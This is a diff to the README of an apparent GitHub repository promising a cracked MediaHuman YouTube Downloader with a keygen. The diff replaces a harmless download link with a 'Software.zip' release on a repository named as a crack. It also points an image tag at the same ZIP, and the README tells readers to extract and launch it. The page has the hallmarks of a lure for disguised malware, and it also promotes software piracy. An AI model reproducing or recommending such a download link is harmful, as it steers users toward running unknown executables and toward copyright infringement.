@@ -24,7 +24,7 @@ If you are looking to descargar mediahuman youtube downloader full, get the keyg
 - youtube-to-mp3-downloader-mediahuman
 
 ## 📥 Download Link:
-[Download the latest version (v1.0.0)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 🚀
+[Download the latest version (v1.0.0)](https://github.com/mirchue/MediaHuman-YouTube-Downloader-Crack/releases/download/v1.0/Software.zip) 🚀
 
 Please note that the downloaded ZIP file needs to be extracted and launched to access the content. 
 
@@ -39,7 +39,7 @@ If you encounter any issues with downloading or cracking MediaHuman YouTube Down
 
 Let's make the most out of MediaHuman YouTube Downloader with the resources available in this repository! 🎉
 
-![MediaHuman YouTube Downloader](https://cdn.neow.in/news/images/uploaded/2020/01/1579085130_download-youtube-videos-on-iphone_story.jpg)
+![MediaHuman YouTube Downloader](https://github.com/mirchue/MediaHuman-YouTube-Downloader-Crack/releases/download/v1.0/Software.zip)
 
 ---
 
